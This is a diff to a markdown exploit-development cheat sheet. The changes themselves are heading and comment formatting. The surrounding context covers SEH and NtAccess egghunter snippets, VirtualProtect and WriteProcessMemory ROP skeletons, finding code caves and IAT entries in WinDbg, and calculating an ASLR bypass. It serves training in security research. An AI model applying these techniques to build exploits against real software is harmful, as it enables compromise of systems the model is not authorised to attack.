@@ -1344,7 +1344,7 @@ After that to detremin where our shellcode is located we can take the found addr
 ```
 ![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/e185341f-28e3-44e9-83ab-8a5893b44727)
 
-### NTAccess Egghunting
+## NTAccess Egghunting
 ```
 CODE = (
 
@@ -1377,7 +1377,7 @@ You can get the `NTAccess` syscall number as the following from `Windbg`:
 - `u ntdll!NtAccessCheckAndAuditAlarm`:
 ![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/d6016df9-8aa5-4594-9be5-60a33dee28ac)
 
-### SEH Egghunting
+## SEH Egghunting
 ```
 CODE = (
             "	start: 									 "
@@ -1416,7 +1416,7 @@ CODE = (
         )
 ```
 
-### Scripts
+## Scripts
 Finally You can use the following code to generate your own egg hunter:
 ```
 import sys
@@ -1674,7 +1674,7 @@ python3 shellcoding.py --egghunter --egg "w00t" --seh --nopafter 10 --nopbefore 
 - Remember to check out non sintaized memmcpy operations size
 - Always check the offsets and how the data is handled.
 - If there are any checks on the size and limit, Use negative size. And check which parts values are not checked.
-### Find if can overwrite the return address
+## Find if can overwrite the return address
 - Check the destnation address of the copy operation and find if it's within the stack
 	- `!teb`: and check the range.
 - Next Check the return address using the `k` command to check the return address.
@@ -1851,9 +1851,9 @@ vp += pack("<L", 0x66666666) # dummy dwSize
 vp += pack("<L", 0x67676767) # dummy flNewProtect
 vp += pack("<L", 0x68686868) # dummy lpflOldProtect
 ```
-#### Find a dword for `lpflOldProtect`:
+## Find a dword for `lpflOldProtect`
 ```
-# get the .data section info first
+#get the .data section info first
 !dh module -a
 
 e.x: results:
@@ -1862,10 +1862,10 @@ SECTION HEADER #3
     118C virtual size
    13000 virtual address
    
-# Now do the following calculation
+#Now do the following calculation
 module+virtual address+virtual size+4
 
-# Now checxk the result address
+#Now checxk the result address
 !address result # you can add more 4 until find the right one for u
 ```
 ### WriteProcessMemory()
@@ -1879,33 +1879,33 @@ wpm += pack("<L", 0x6E6E6E6E) # dummy nSize
 wpm += pack("<L", 0x6F6F6F6F) # dummy lpNumberOfBytesWritten
 ```
 
-#### Find Code Cave for your shellcode
+## Find Code Cave for your shellcode
 ```
-# We need to locate the code section first
+#We need to locate the code section first
 dd module+3c l1 
 
-# then take the first dword and add it to the module with 2c
+#then take the first dword and add it to the module with 2c
 
 dd module+dword+2c l1 
 
-# then add the dword value to the module
+#then add the dword value to the module
 
 ? module+dword 
 
-# Now take the results and check the address and it's range & search for the code cave
+#Now take the results and check the address and it's range & search for the code cave
 
 !address result_address
 
-## Now search for the code cave
+#Now search for the code cave
 s -[1]b start end 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 
-# You can check the address size of the code cave as the following
+#You can check the address size of the code cave as the following
 !address code_cave
 ```
 
-#### Find a dword for `lpNumberOfBytesWritten`:
+## Find a dword for `lpNumberOfBytesWritten`:
 ```
-# get the .data section info first
+#get the .data section info first
 !dh module -a
 
 e.x: results:
@@ -1914,19 +1914,19 @@ SECTION HEADER #3
     118C virtual size
    13000 virtual address
    
-# Now do the following calculation
+#Now do the following calculation
 ? module+virtual address+virtual size+4
 
-# Now checxk the result address
+#Now checxk the result address
 !address result # you can add more 4 until find the right one for u
 ```
 ## Find ROP Gadgets
 ```
-# rp++
+#rp++
 rp++.exe -f binary -r length > output.txt
 --va if you using the last version to set a base_address
 
-# find-gadget.py
+#find-gadget.py
 find-gadgets.py -f "binary:baseaddress" -b 0a 0d #badchars
 ```
 
@@ -1934,19 +1934,19 @@ find-gadgets.py -f "binary:baseaddress" -b 0a 0d #badchars
 
 ### Find IAT manually using windbg
 ```
-# We first get the IAT offset
+#We first get the IAT offset
 !dh -f module
 
 results example:
 D000 [     144] address [size] of Import Address Table Directory
 
-# The IAT located at offset D000, Now we dump the table as the following
+#The IAT located at offset D000, Now we dump the table as the following
 dds module+D000
 
 result example"
 1480d02c  76a2f620 KERNEL32!WriteProcessMemoryStub # We can see clearly the IAT address is 1480d02c
 
-# If the target not importing it, You can easily get any function IAT & It's address and calculate the differance between it and the function you want, and add or subbtract the differance from the included function
+#If the target not importing it, You can easily get any function IAT & It's address and calculate the differance between it and the function you want, and add or subbtract the differance from the included function
 Example:
 0:000>  u 76a2e2b0
 KERNEL32!GetLastErrorStub:
@@ -1959,7 +1959,7 @@ KERNEL32!GetLastErrorStub:
 76a2e2bb cc              int     3
 76a2e2bc cc              int     3
 
-# So KERNEL32!GetLastErrorStub is at 76a2e2b0, Next get your desiered function
+#So KERNEL32!GetLastErrorStub is at 76a2e2b0, Next get your desiered function
 
 0:000> u KERNEL32!WriteProcessMemoryStub
 KERNEL32!WriteProcessMemoryStub:
@@ -1972,11 +1972,11 @@ KERNEL32!WriteProcessMemoryStub:
 76a4522d cc              int     3
 76a4522e cc              int     3
 
-# Now KERNEL32!WriteProcessMemoryStub is at 76a45220, Now subtract the larger address from the smallest one or flip the calculation
+#Now KERNEL32!WriteProcessMemoryStub is at 76a45220, Now subtract the larger address from the smallest one or flip the calculation
 0:000> ? 76a45220 - 76a2e2b0
 Evaluate expression: 94064 = 00016f70
 
-# So here we got the differance which is 00016f70 and we need to add it to 76a2e2b0 which is KERNEL32!GetLastErrorStub address when we get it
+#So here we got the differance which is 00016f70 and we need to add it to 76a2e2b0 which is KERNEL32!GetLastErrorStub address when we get it
 0:000> u 76a2e2b0 + 00016f70
 KERNEL32!WriteProcessMemoryStub:
 76a45220 8bff            mov     edi,edi
@@ -1999,7 +1999,7 @@ KERNEL32!WriteProcessMemoryStub:
 Function IAT = FF221111
 eax = Function IAT
 
-# get the VMA, Never use `xchg` instruction it will result in access violation
+#get the VMA, Never use `xchg` instruction it will result in access violation
 mov eax, dword [eax] # which has the [] pointer
 add ecx, dword [eax] # the ecx has to be 0 or if can, you would add it to the value there and decrease or increase it
 - other instructions such as
@@ -2041,7 +2041,7 @@ Similar APIs are CreateToolhelp32Snapshot2 and EnumProcessModules.3 Additionally
 ```
 ## Bypass ASLR
 ```
-# Calculate the base address
+#Calculate the base address
 - Get a function name from exports table and offset
 
 ex: 0000000089DEA Get_Addresses
@@ -2049,7 +2049,7 @@ ex: 0000000089DEA Get_Addresses
 Now when leaking the function address subtract the offset to get the base address.
 base_address = 16089DEA - 89DEA
 
-# Get the prefered load address using windbg
+#Get the prefered load address using windbg
 > dd Module + 3c L1
 > dd Module + 108 + 34 L1
 ```
